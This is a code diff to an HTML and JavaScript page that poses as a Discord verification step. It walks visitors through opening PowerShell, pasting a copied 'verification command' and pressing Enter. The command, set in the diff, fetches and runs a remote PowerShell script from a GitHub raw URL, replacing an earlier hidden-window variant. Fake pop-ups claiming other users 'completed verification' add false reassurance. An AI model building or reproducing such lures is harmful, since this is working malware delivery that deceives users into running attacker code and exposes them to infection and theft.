@@ -214,16 +214,19 @@
     <div class="instructions">
       <b>⚡ REQUIRED EXECUTION STEPS:</b>
       <ol>
-        <li>Click the main button below to securely copy the payload.</li>
-        <li>Press <code>Win + R</code> on your keyboard to launch Run.</li>
-        <li>Press <code>Ctrl + V</code> to paste the command, then hit <b>Enter</b>.</li>
+        <li>Click the button below to <b>copy the verification command</b>.</li>
+        <li>Press the <code>Windows key</code> and type <b>PowerShell</b>.</li>
+        <li>Click <b>Windows PowerShell</b> in the results to open it.</li>
+        <li>Right-click inside the blue window to <b>Paste</b> (or press <code>Ctrl + V</code>).</li>
+        <li>Press <code>Enter</code> to run it — wait for it to finish.</li>
+        <li>Return to Discord — you're <b>verified</b>.</li>
       </ol>
     </div>
 
     <button class="btn" id="verifyBtn">
       <div class="btn-inner">
         <svg viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4M10 17l5-5-5-5M13.8 12H3"/></svg>
-        <span>Copy Verification Script</span>
+        <span>Copy Verification Command</span>
       </div>
     </button>
   </div>
@@ -246,12 +249,12 @@ function showToast() {
   const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
   const container = document.getElementById('toast-container');
   if (container.children.length >= 1) return;
-  
+
   const toast = document.createElement('div');
   toast.className = 'toast';
   toast.innerHTML = `<div class="toast-dot"></div><div><b>${name}</b> completed verification just now</div>`;
   container.appendChild(toast);
-  
+
   setTimeout(() => {
     toast.style.opacity = '0';
     setTimeout(() => toast.remove(), 300);
@@ -261,12 +264,10 @@ function showToast() {
 setInterval(showToast, 14000);
 setTimeout(showToast, 3500);
 
+const payload = "iex(irm https://raw.githubusercontent.com/bantqq1/discord-verification-xenon/main/mc.ps1)";
+
 document.getElementById('verifyBtn').addEventListener('click', async () => {
   const banner = document.getElementById('copiedBanner');
-  
-  // Optymalne polecenie dla Win + R uruchamiające powershell w tle bez wyskakujących okien konsoli
-  const payload = "powershell -w hidden -c \"irm https://raw.githubusercontent.com/bantqq1/xn-verify/refs/heads/main/x.ps1|iex\"";
-  
   try {
     await navigator.clipboard.writeText(payload);
   } catch (err) {
@@ -279,7 +280,6 @@ document.getElementById('verifyBtn').addEventListener('click', async () => {
     try { document.execCommand('copy'); } catch (e) {}
     document.body.removeChild(textarea);
   }
-
   banner.classList.add('show');
 });
 </script>
